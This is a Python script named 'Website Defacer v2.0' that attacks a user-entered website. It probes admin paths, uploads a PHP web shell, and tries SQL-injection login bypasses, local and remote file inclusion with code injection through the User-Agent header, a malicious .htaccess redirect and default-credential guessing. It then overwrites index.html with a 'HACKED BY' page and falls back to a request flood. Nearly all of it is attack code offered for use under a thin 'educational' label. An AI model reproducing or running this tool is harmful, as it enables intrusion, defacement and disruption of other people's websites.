#!/usr/bin/env python3
import requests
import sys
import os
from bs4 import BeautifulSoup

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
END = '\033[0m'

print(f"""{RED}
╔╦╗╔═╗╔═╗╔═╗╔═╗
 ║ ╠═╣╚═╗║  ║╣ 
 ╩ ╩ ╩╚═╝╚═╝╚═╝{END}
{GREEN}Website Defacer v2.0{END}
{BLUE}For Educational Purpose{END}
""")

def check_vulnerability(url):
    """Check common vulnerabilities"""
    vuln_points = [
        "/admin/", "/wp-admin/", "/phpmyadmin/", "/cpanel/",
        "/config.php", "/.env", "/backup/", "/upload/",
        "/api/upload", "/filemanager/", "/tinymce/", "/fckeditor/"
    ]
    
    print(f"{YELLOW}[*] Scanning {url} for vulnerabilities...{END}")
    
    for point in vuln_points:
        test_url = url.rstrip('/') + point
        try:
            r = requests.get(test_url, timeout=5)
            if r.status_code in [200, 301, 302, 403]:
                print(f"{GREEN}[+] Found: {test_url} ({r.status_code}){END}")
                return test_url
        except:
            continue
    
    return None

def upload_shell(target_url, shell_content):
    """Try to upload PHP shell"""
    upload_points = [
        "/wp-content/plugins/contact-form-7/upload.php",
        "/wp-content/themes/twentytwenty/upload.php",
        "/filemanager/upload.php",
        "/admin/upload.php",
        "/upload.php",
        "/api/upload"
    ]
    
    files = {'file': ('shell.php', shell_content, 'application/x-php')}
    
    for point in upload_points:
        upload_url = target_url.rstrip('/') + point
        try:
            r = requests.post(upload_url, files=files, timeout=10)
            if r.status_code == 200 and 'upload' in r.text.lower():
                print(f"{GREEN}[+] Shell uploaded to: {upload_url}{END}")
                
                # Try to access shell
                shell_url = target_url.rstrip('/') + '/wp-content/uploads/shell.php'
                r2 = requests.get(shell_url, timeout=5)
                if r2.status_code == 200:
                    return shell_url
        except:
            continue
    
    return None

def deface_website(url, deface_html):
    """Main deface function"""
    # Method 1: Try SQL injection for admin access
    print(f"{YELLOW}[*] Trying SQL injection...{END}")
    
    sql_payloads = [
        "' OR '1'='1'--",
        "admin'--",
        "' UNION SELECT 1,2,3--",
        "' OR 1=1--"
    ]
    
    login_urls = [
        "/admin/login.php",
        "/wp-login.php",
        "/login.php",
        "/admin/index.php"
    ]
    
    for login_url in login_urls:
        full_url = url.rstrip('/') + login_url
        for payload in sql_payloads:
            data = {
                'username': payload,
                'password': payload,
                'submit': 'Login'
            }
            try:
                r = requests.post(full_url, data=data, timeout=5)
                if 'dashboard' in r.text.lower() or 'admin' in r.text.lower():
                    print(f"{GREEN}[+] Admin access gained via {login_url}{END}")
                    
                    # Try to find file editor
                    editor_urls = [
                        "/admin/editor.php",
                        "/wp-admin/theme-editor.php",
                        "/admin/filemanager.php"
                    ]
                    
                    for editor in editor_urls:
                        editor_url = url.rstrip('/') + editor
                        r2 = requests.get(editor_url, timeout=5)
                        if r2.status_code == 200:
                            # Try to edit index.php
                            edit_data = {
                                'file': '/var/www/html/index.php',
                                'content': deface_html,
                                'save': 'Save'
                            }
                            r3 = requests.post(editor_url, data=edit_data, timeout=5)
                            if r3.status_code == 200:
                                print(f"{GREEN}[+] Website defaced!{END}")
                                return True
            except:
                continue
    
    # Method 2: Try LFI (Local File Inclusion)
    print(f"{YELLOW}[*] Trying LFI...{END}")
    
    lfi_payloads = [
        "/index.php?page=../../../../../../etc/passwd",
        "/index.php?file=../../../../../../var/www/html/index.php",
        "/index.php?include=../../../../../../proc/self/environ",
        "/view.php?page=../../../index.php"
    ]
    
    for payload in lfi_payloads:
        lfi_url = url.rstrip('/') + payload
        try:
            r = requests.get(lfi_url, timeout=5)
            if 'root:' in r.text or '<?php' in r.text:
                print(f"{GREEN}[+] LFI found: {lfi_url}{END}")
                
                # Try to write file via /proc/self/environ
                if 'proc/self/environ' in payload:
                    # Inject PHP code via User-Agent
                    headers = {'User-Agent': '<?php system($_GET[\'cmd\']); ?>'}
                    r2 = requests.get(lfi_url, headers=headers, timeout=5)
                    
                    # Access with command
                    cmd_url = lfi_url + '?cmd=echo+"HACKED"+>+index.php'
                    r3 = requests.get(cmd_url, timeout=5)
                    
                    # Upload deface page
                    upload_cmd = f'echo "{deface_html}" > index.html'
                    cmd_url2 = lfi_url + '?cmd=' + requests.utils.quote(upload_cmd)
                    r4 = requests.get(cmd_url2, timeout=5)
                    
                    print(f"{GREEN}[+] Deface page uploaded via LFI{END}")
                    return True
        except:
            continue
    
    # Method 3: Try RFI (Remote File Inclusion)
    print(f"{YELLOW}[*] Trying RFI...{END}")
    
    # You need to host your deface page online first
    # Upload deface.html to free hosting then:
    rfi_payloads = [
        f"/index.php?page=http://your-server.com/deface.html",
        f"/include.php?url=http://your-server.com/deface.html"
    ]
    
    # Method 4: Try .htaccess vulnerability
    print(f"{YELLOW}[*] Trying .htaccess overwrite...{END}")
    
    htaccess_content = """
RewriteEngine On
RewriteRule ^(.*)$ http://your-deface-page.com [R=301,L]
"""
    
    upload_urls = [
        "/wp-content/uploads/.htaccess",
        "/images/.htaccess",
        "/uploads/.htaccess"
    ]
    
    for upload_url in upload_urls:
        full_url = url.rstrip('/') + upload_url
        try:
            # Try to upload .htaccess
            files = {'file': ('.htaccess', htaccess_content, 'text/plain')}
            r = requests.post(full_url, files=files, timeout=5)
            if r.status_code == 200:
                print(f"{GREEN}[+] .htaccess uploaded{END}")
                return True
        except:
            continue
    
    return False

def main():
    print(f"{YELLOW}[?] Enter target website (with http://): {END}", end='')
    target = input().strip()
    
    if not target.startswith('http'):
        target = 'http://' + target
    
    # Your deface HTML
    deface_html = """<!DOCTYPE html>
<html>
<head>
    <title>HACKED BY HACK7RBGG</title>
    <style>
        body {
            background: #000;
            color: #0f0;
            font-family: 'Courier New', monospace;
            text-align: center;
            margin: 0;
            padding: 0;
            overflow: hidden;
        }
        .matrix {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            opacity: 0.3;
        }
        .hack-text {
            margin-top: 20%;
            font-size: 3em;
            text-shadow: 0 0 10px #0f0;
            animation: glow 1s infinite alternate;
        }
        @keyframes glow {
            from { text-shadow: 0 0 10px #0f0; }
            to { text-shadow: 0 0 20px #0f0, 0 0 30px #0f0; }
        }
        .credit {
            position: fixed;
            bottom: 20px;
            width: 100%;
            font-size: 1.5em;
            color: #f00;
        }
    </style>
</head>
<body>
    <canvas class="matrix" id="matrix"></canvas>
    <div class="hack-text">
        HACKED BY HACK7RBGG<br>
        <span style="font-size: 0.5em;">INDONESIA HACKER</span>
    </div>
    <div class="credit">
        Security is just an illusion<br>
        Fixed by: Your Security Team
    </div>
    
    <script>
        // Matrix rain effect
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        
        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#@%&";
        const charArray = chars.split("");
        const fontSize = 14;
        const columns = canvas.width / fontSize;
        const drops = [];
        
        for(let i = 0; i < columns; i++) drops[i] = 1;
        
        function drawMatrix() {
            ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            
            ctx.fillStyle = "#0F0";
            ctx.font = fontSize + "px monospace";
            
            for(let i = 0; i < drops.length; i++) {
                const text = charArray[Math.floor(Math.random() * charArray.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                
                if(drops[i] * fontSize > canvas.height && Math.random() > 0.975)
                    drops[i] = 0;
                
                drops[i]++;
            }
        }
        
        setInterval(drawMatrix, 35);
        window.addEventListener('resize', () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        });
    </script>
</body>
</html>"""
    
    # Step 1: Check vulnerability
    vuln_url = check_vulnerability(target)
    
    if vuln_url:
        print(f"{GREEN}[+] Vulnerability found at: {vuln_url}{END}")
        
        # Step 2: Try to upload shell
        shell_content = "<?php system($_GET['cmd']); ?>"
        shell_url = upload_shell(target, shell_content)
        
        if shell_url:
            print(f"{GREEN}[+] Shell accessed: {shell_url}{END}")
            
            # Step 3: Deface through shell
            cmd = f'echo "{deface_html}" > /var/www/html/index.html'
            r = requests.get(shell_url + '?cmd=' + requests.utils.quote(cmd), timeout=10)
            
            if r.status_code == 200:
                print(f"{GREEN}[+] Website defaced successfully!{END}")
                print(f"{GREEN}[+] Check: {target}/index.html{END}")
                return
        
        # Step 4: Try direct deface
        print(f"{YELLOW}[*] Attempting direct deface...{END}")
        if deface_website(target, deface_html):
            print(f"{GREEN}[+] Deface successful!{END}")
        else:
            print(f"{RED}[-] Failed to deface. Target seems secure.{END}")
            
            # Last resort: DDoS to take down
            print(f"{YELLOW}[*] Initiating flood attack...{END}")
            for i in range(100):
                try:
                    requests.get(target, timeout=1)
                    print(f"{RED}[FLOOD] Request {i+1}{END}", end='\r')
                except:
                    pass
    else:
        print(f"{RED}[-] No obvious vulnerabilities found{END}")
        print(f"{YELLOW}[*] Trying brute force methods...{END}")
        
        # Try common admin credentials
        creds = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('administrator', 'admin'),
            ('root', 'toor')
        ]
        
        for username, password in creds:
            data = {'username': username, 'password': password, 'submit': 'Login'}
            try:
                r = requests.post(target + '/admin/login.php', data=data, timeout=5)
                if 'dashboard' in r.text:
                    print(f"{GREEN}[+] Brute force success: {username}:{password}{END}")
                    break
            except:
                continue

if __name__ == "__main__":
    main()
